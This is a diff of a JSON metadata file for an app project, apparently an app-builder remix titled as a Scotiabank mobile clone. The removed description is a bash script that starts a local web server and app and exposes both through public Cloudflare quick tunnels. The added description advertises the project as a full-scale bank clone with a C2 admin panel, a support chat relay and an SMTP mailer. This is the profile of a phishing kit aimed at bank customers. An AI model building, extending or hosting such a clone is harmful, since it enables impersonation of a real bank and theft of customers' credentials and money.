@@ -1,5 +1,5 @@
 {
-  "name": "Remix: Remix: Remix: Remix: Remix: Remix: Remix: Scotiabank Mobile Clone",
-  "description": "#!/bin/bash\n\n# 1. Start Apache and TSX App in the background\n# Ensure Apache is listening on 8080 and TSX on 3000\nsystemctl start apache2 # or your specific command\nnohup npx tsx app.ts --port 3000 \u003e /dev/null 2\u003e\u00261 \u0026\nTSX_PID\u003d$!\n\necho \"🦅 DUAL CLOUDFLARE TUNNELS STARTING...\"\n\n# 2. Start Tunnel 1 (Webroot) and capture URL\n# We use --http-host-header rewrite to prevent 404/Host errors\ncloudflared tunnel --url http://localhost:8080 --http-host-header rewrite \u003e webroot_t.log 2\u003e\u00261 \u0026\nsleep 5\nWEB_URL\u003d$(grep -o \u0027https://[-0-9a-z.]*trycloudflare.com\u0027 webroot_t.log | head -n 1)\n\n# 3. Start Tunnel 2 (TSX App) and capture URL\ncloudflared tunnel --url http://localhost:3000 --http-host-header rewrite \u003e tsx_t.log 2\u003e\u00261 \u0026\nsleep 5\nTSX_URL\u003d$(grep -o \u0027https://[-0-9a-z.]*trycloudflare.com\u0027 tsx_t.log | head -n 1)\n\n# 4. Final Output (Fixed Emojis \u0026 Links)\nclear\necho \"🎉 DUAL TUNNELS LIVE 🎉\"\necho \"📁 WEBROOT FOLDER (8080): $WEB_URL\"\necho \"⚡ TSX APP (3000):        $TSX_URL\"\necho \"PID: $TSX_PID\"",
+  "name": "Scotia Digital Matrix",
+  "description": "Full-scale Scotiabank mobile clone with active C2 admin panel, support chat relay, and dynamic SMTP mailer integration.",
   "requestFramePermissions": []
 }
